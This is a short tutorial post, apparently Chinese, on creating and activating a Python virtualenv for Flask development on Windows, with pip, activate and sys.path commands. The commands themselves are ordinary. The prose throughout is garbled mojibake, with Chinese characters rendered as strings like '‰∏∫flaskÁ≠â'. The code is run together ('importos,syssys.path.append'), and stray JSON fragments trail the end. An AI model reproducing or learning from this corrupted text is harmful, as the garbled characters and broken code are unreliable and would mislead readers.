virtualenv‰∏∫flaskÁ≠âwebÊ°ÜÊû∂Êèê‰æõËôöÊãüpythonÁéØÂ¢ÉÔºàÂÖ∂‰ªñÂ∫îÁî®‰πüÂèØ‰ª•ÔºâÔºåËøôÊ†∑ÂèØ‰ª•Èò≤Ê≠¢ÂºÄÂèëËøáÁ®ã‰∏≠ÂÆâË£ÖÁöÑ‰æùËµñÂΩ±ÂìçÂéü‰∏ªÊú∫‰∏äÁöÑpythonÁéØÂ¢ÉÔºåËÄå‰∏îÂú®ËøÅÁßªÂà∞‰∏äÁ∫øÁéØÂ¢É‰∏≠Êó∂ÔºåÁúÅÂéª‰∫ÜÈÖçÁΩÆ‰∏äÁ∫øÁéØÂ¢É‰∏≠ÁöÑpythonËøêË°åÁéØÂ¢É„ÄÇ ÂÆâË£Övirtualenv ËøôÈáåÊàëÊé®Ëçê‰ΩøÁî®pipÊàñËÄÖeasy_installÂÆâË£ÖÔºåÂêåÊ†∑‰πüÂèØ‰ª•ÈÄöËøá‰∏ãËΩΩvirtualenv.pyÊù•ÊûÑÂª∫ËôöÊãüÁéØÂ¢É„ÄÇ ‰ΩøÁî®pipÂëΩ‰ª§ pip install virtualenv Âª∫Á´ãÁéØÂ¢É È¶ñÂÖàËøõÂÖ•ÁΩëÁ´ôÁöÑÊ†πÁõÆÂΩïÔºàÊàñËÄÖÊòØ‰ªª‰ΩïÈúÄË¶ÅÂª∫Á´ãËôöÊãüÁéØÂ¢ÉÁöÑÊñá‰ª∂Â§π‰∏ãÔºâ ‰ΩøÁî®dosÂëΩ‰ª§ virtualenv venv ÂÖ∂‰∏≠venv‰∏∫pythonÁöÑËôöÊãüÁéØÂ¢ÉÔºåÂÖ∂‰∏≠ÂåÖÊã¨‰∫Üpython.exe„ÄÅpip„ÄÅeasy_installÁ≠âpythonÁéØÂ¢É„ÄÇ ÊøÄÊ¥ªÁéØÂ¢É ÂÆåÊàê‰∏ä‰∏ÄÊ≠•ÂêéÔºåÊé•‰∏ãÊù•ÈúÄË¶ÅÂú®dosÁïåÈù¢ÊøÄÊ¥ªËôöÊãüÁéØÂ¢ÉÔºåËøôÊ†∑ÂèØ‰ª•‰ΩøÂæóÊé•‰∏ãÊù•‰∏ãËΩΩÁöÑpythonÊ®°ÂùóÈÉΩ‰Ωç‰∫évenv‰∏ãÁöÑpipÁéØÂ¢É‰∏≠Scripts\\activate ÊøÄÊ¥ªËôöÊãüÁéØÂ¢Édeactivate ÈÄÄÂá∫ËôöÊãüÁéØÂ¢É ÊøÄÊ¥ªÂêéÂëΩ‰ª§Ë°åÂºÄÂ§¥Â§ö‰∫ÜÔºàvenvÔºâÔºåÂ¶Ç‰∏ã12E:\\code\\python-workplace\\flasker\\venv&gt;Scripts\\activate(venv) E:\\code\\python-workplace\\flasker\\venv&gt; ÂÆâË£ÖÊ®°Âùó Âú®‰∏äÈù¢ÁöÑÂü∫Á°Ä‰∏ãÔºåÈÄöËøápip install xxxxÂÆâË£ÖÁöÑÊ®°ÂùóÈÉΩÊòØÂÆâË£ÖÂú®venvÁéØÂ¢É‰∏ãÁöÑÔºåÂØπ‰∏ªÊú∫‰∏äÁöÑÁéØÂ¢ÉÊ≤°ÊúâÂΩ±Âìç„ÄÇ ÂºïÂÖ•Ë∑ØÂæÑ Âú®ÂÖ∑‰Ωì‰ΩøÁî®ËøáÁ®ã‰∏≠ÔºåÈúÄË¶ÅÊäävenvÁöÑË∑ØÂæÑÂØºÂÖ•sys.pathÔºåËøôÊ†∑ÊâçÂèØ‰ª•‰ΩøÁî®ËôöÊãüÁéØÂ¢É‰∏≠ÁöÑpythonÊ®°Âùó„ÄÇ12importos,syssys.path.append(os.getcwd()+'\\\\venv\\\\Lib\\\\site-packages') Âà∞ËøôÈáåÂ∞±ÂÆåÊàê‰∫ÜpythonËôöÊãüÁéØÂ¢ÉÁöÑÊê≠Âª∫ÔºåÊÄª‰ΩìÂØπÁªèÂ∏∏ÂèòÂä®ÁºñÁ®ãÁéØÂ¢ÉÁöÑÂüéÊó≠ÁåøÊù•ËØ¥ËøôÊòØ‰∏™ÈùûÂ∏∏ÊúâÁî®ÂäüËÉΩ„ÄÇ ==The End=="}]}